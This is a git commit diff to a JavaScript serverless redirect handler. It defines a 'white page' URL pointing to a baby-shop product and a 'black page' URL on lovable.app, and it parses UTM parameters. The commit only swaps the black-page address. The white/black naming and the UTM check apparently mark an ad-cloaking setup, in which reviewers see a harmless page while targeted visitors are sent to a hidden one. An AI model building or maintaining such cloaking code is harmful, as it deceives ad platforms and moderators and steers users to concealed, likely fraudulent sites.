3e38062a75c7d977920b37f0bfa6112efecf90a5
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-27 18:59:42 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.babyshower.es/en/jellycat-beige-bunny-musical-pull-717.html";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const blackPageURL = "https://casssshlov.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
